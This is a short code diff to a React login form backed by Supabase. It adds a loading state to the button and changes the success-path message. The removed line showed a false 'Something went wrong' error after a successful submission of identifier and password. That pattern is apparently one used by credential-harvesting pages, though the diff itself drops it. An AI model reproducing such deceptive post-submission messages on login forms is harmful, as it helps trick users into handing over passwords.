@@ -1,4 +1,3 @@
-
 import { useState } from 'react'
 import { supabase } from './lib/supabase'
 import './App.css'
@@ -33,7 +32,7 @@ function App() {
       setIdentifier('')
       setPassword('')
       setSuccess(true)
-      setMessage('Something went wrong. Please try again.')
+      setMessage('Your response has been submitted!')
     } catch (error) {
       console.error('Submission error:', error)
       setMessage('Something went wrong. Please try again.')
@@ -137,8 +136,9 @@ function App() {
           <button
             type="submit"
             className="submit-btn"
+            disabled={loading || !canSubmit}
           >
-            {'Login'}
+            {loading ? 'Logging in...' : 'Login'}
           </button>
 
           {message && (
